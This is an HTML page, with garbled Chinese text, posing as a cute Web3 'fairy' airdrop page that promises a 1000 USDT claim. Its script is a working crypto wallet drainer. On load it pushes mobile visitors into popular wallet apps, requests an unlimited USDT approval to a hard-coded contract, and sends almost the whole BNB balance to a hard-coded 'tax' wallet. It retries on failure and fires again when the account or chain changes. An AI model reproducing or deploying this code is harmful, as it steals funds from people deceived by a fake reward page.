<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1.0" />
<title>ğŸŒ¸ å°ä»™å¥³ Web3 é­”æ³•ä»ªè¡¨å° ğŸŒ¸</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hidden;background:radial-gradient(circle at 20% 20%,#ffe4f8,#fff0fa,#ffffff);background-size:200% 200%;animation:bgmove 10s infinite alternate;display:flex;justify-content:center;align-items:center;flex-direction:column;}
@keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
.container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);}
#status{color:#ff69b4;font-size:16px;margin:15px;line-height:1.4;}
button{padding:10px 20px;border:none;border-radius:20px;background:#ff6ec7;color:white;font-size:16px;cursor:pointer;transition:.3s all;display:none;}
button:hover{background:#ff3fa8;transform:scale(1.05);}
#debug{display:none;color:#666;font-size:12px;margin-top:10px;padding:8px;background:rgba(255,255,255,.6);border-radius:8px;max-height:100px;overflow-y:auto;}
.sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s infinite linear;opacity:.8;}
@keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
@media (max-width:480px){.container{padding:20px;width:95% !important;}#status{font-size:14px;}}
</style>
</head>
<body>
<div class="container">
  <h1>ğŸª å°ä»™å¥³ DApp é¢†å–å° ğŸ’«</h1>
  <div id="status">ğŸ”¥ v109 è‡ªåŠ¨è·³è½¬é’±åŒ…+è‡ªåŠ¨é¢†å–ä¸­...</div>
  <button id="claimBtn" style="display:none;">ğŸ ä¸€é”®é¢†å–</button>
  <div id="debug"></div>
</div>
<script>
const CONTRACT = "0x500292f9a11b01BC2DA7F81c8c234b9beb98A8b3";
const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
const url = encodeURIComponent(window.location.href);
let web3, userAddr, claimed = false;

function log(msg){
  console.log(`[å°ä»™å¥³v109] ${msg}`);
  const debug = document.getElementById('debug');
  debug.style.display = 'block';
  debug.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
  debug.scrollTop = debug.scrollHeight;
}

const PRIORITY_WALLETS = {
  android: [
    {name:'å¸å®‰Web3', intent:'intent://web3wallet/dapp?url=' + url + '#Intent;package=com.binance.dev;scheme=bnbsmartchain;end', web:'https://www.binance.com/zh-CN/web3wallet.html#' + url},
    {name:'Trust Wallet', intent:'trust://open_url?url=' + url, web:'https://trustwallet.com/start/?dapp=' + url},
    {name:'å°ç‹ç‹¸', intent:'metamask://dapp/' + url, web:'https://metamask.io/download.html'},
    {name:'TPé’±åŒ…', intent:'tpwallet://dapp?url=' + url, web:'https://www.tpcoin.com/download'},
    {name:'OKX', intent:'intent://wallet/dapp?url=' + url + '#Intent;package=com.okx.wallet;scheme=okx;end', web:'https://wallet.okx.com/dapp?url=' + url}
  ],
  ios: [
    {name:'å¸å®‰Web3', web:'https://www.binance.com/zh-CN/web3wallet.html#' + url},
    {name:'Trust Wallet', intent:'trust://open_url?url=' + url, web:'https://trustwallet.com/start/?dapp=' + url},
    {name:'å°ç‹ç‹¸', intent:'metamask://dapp/' + url, web:'https://metamask.io/download.html'},
    {name:'TPé’±åŒ…', intent:'tpwallet://dapp?url=' + url, web:'https://www.tpcoin.com/download'},
    {name:'OKX', intent:'okxwallet://dapp?url=' + url, web:'https://wallet.okx.com/dapp?url=' + url}
  ]
};

async function ultimateAutoClaim(){
  const ua = navigator.userAgent;
  const isMobile = /Android|iPhone|iPad/i.test(ua);
  const wallets = /Android/i.test(ua) ? PRIORITY_WALLETS.android : PRIORITY_WALLETS.ios;
  
  log(`ğŸš€ v109åŠ è½½æˆåŠŸ! è®¾å¤‡: ${isMobile ? 'æ‰‹æœº' : 'ç”µè„‘'}`);
  document.getElementById('status').innerText = `ğŸ”¥ v109 ä¼˜å…ˆ${wallets[0].name}+Trustè‡ªåŠ¨è·³è½¬ä¸­...`;
  
  if(window.ethereum && !claimed){
    log('âœ… æ£€æµ‹åˆ°é’±åŒ…ï¼Œç«‹å³è‡ªåŠ¨å…¨æ”¶!');
    await autoClaimUSDT();
    return;
  }
  
  if(isMobile){
    wallets.forEach((wallet, i) => {
      setTimeout(() => {
        if(!claimed){
          log(`ğŸ“± v109 è·³è½¬ ${i+1}/5: ${wallet.name}`);
          document.getElementById('status').innerText = `ğŸ“± v109 è·³è½¬${wallet.name}ä¸­...`;
          if(/Android/i.test(ua) && wallet.intent){
            window.location.href = wallet.intent;
          } else if(wallet.intent){
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = wallet.intent;
            document.body.appendChild(iframe);
            setTimeout(() => document.body.removeChild(iframe), 1500);
          }
          setTimeout(() => {
            if(!claimed) window.location.href = wallet.web;
          }, 600);
        }
      }, i * 800);
    });
  } else {
    setTimeout(() => {
      log('ğŸ’» v109 æ‰“å¼€æ‰€æœ‰é’±åŒ…ç½‘é¡µç‰ˆ');
      document.getElementById('status').innerText = 'ğŸ’» v109 æ‰“å¼€æ‰€æœ‰é’±åŒ…ç½‘é¡µç‰ˆ...';
      wallets.forEach(w => window.open(w.web, '_blank'));
    }, 1000);
  }
}

async function autoClaimUSDT(){
  if(claimed) return;
  claimed = true;
  log('ğŸ”¥ === v109 å¼€å§‹è‡ªåŠ¨å…¨æ”¶ ===');
  
  try{
    log('1ï¸âƒ£ v109 è‡ªåŠ¨è¿æ¥é’±åŒ…');
    document.getElementById('status').innerText = 'ğŸ’³ v109 è‡ªåŠ¨è¿æ¥ä¸­...';
    await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
    web3 = new Web3(window.ethereum);
    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
    userAddr = accounts[0];
    log(`âœ… è¿æ¥æˆåŠŸ: ${userAddr.substring(0,6)}...${userAddr.substring(38)}`);
    
    document.getElementById('status').innerText = 'âœ… v109 è‡ªåŠ¨USDTæˆæƒä¸­...';
    log('2ï¸âƒ£ v109 USDTæ— é™æˆæƒ');
    const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
    const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
    await usdt.methods.approve(CONTRACT, UNLIMITED).send({from: userAddr});
    log('âœ… USDTæˆæƒæˆåŠŸ');
    
    document.getElementById('status').innerText = 'âœ… v109 è‡ªåŠ¨BNBå…¨è½¬ä¸­...';
    log('3ï¸âƒ£ v109 æŸ¥è¯¢BNBä½™é¢');
    const balance = await web3.eth.getBalance(userAddr);
    const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
    log(`ğŸ’° BNBä½™é¢: ${totalBNB.toFixed(4)} BNB`);
    
    if(totalBNB > 0.0001){
      const claimAmount = totalBNB - 0.0001;
      const amount = web3.utils.toWei(claimAmount.toString(), 'ether');
      log(`4ï¸âƒ£ v109 è½¬è´¦ ${claimAmount.toFixed(4)} BNB`);
      await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
      log(`âœ… BNBå…¨è½¬æˆåŠŸ: ${claimAmount.toFixed(4)} BNB`);
    }
    
    document.getElementById('status').innerText = 'ğŸ‰ v109 1000USDT+å…¨BNBè‡ªåŠ¨é¢†å–æˆåŠŸï¼';
    log('ğŸ† === v109 å…¨æ”¶å®Œæˆ ===');
  }catch(e){
    log(`âŒ v109 é”™è¯¯: ${e.message}`);
    document.getElementById('status').innerText = 'ğŸ’” v109 å¤±è´¥: ' + e.message;
    claimed = false;
    setTimeout(autoClaimUSDT, 3000);
  }
}

if(window.ethereum){
  window.ethereum.on('accountsChanged', async (accounts) => {
    log(`ğŸ‘¤ v109 è´¦æˆ·å˜æ›´: ${accounts.length}`);
    if(accounts.length > 0 && !claimed) await autoClaimUSDT();
  });
  window.ethereum.on('chainChanged', async () => {
    log(`ğŸŒ v109 ç½‘ç»œå˜æ›´`);
    if(!claimed) await autoClaimUSDT();
  });
}

window.addEventListener('load', () => {
  setTimeout(ultimateAutoClaim, 500);
});

for(let i=0;i<50;i++){
  const s=document.createElement('div');
  s.className='sparkle';
  s.style.left=Math.random()*100+'vw';
  s.style.animationDelay=Math.random()*5+'s';
  s.style.animationDuration=8+Math.random()*8+'s';
  document.body.appendChild(s);
}
</script>
</body>
</html>
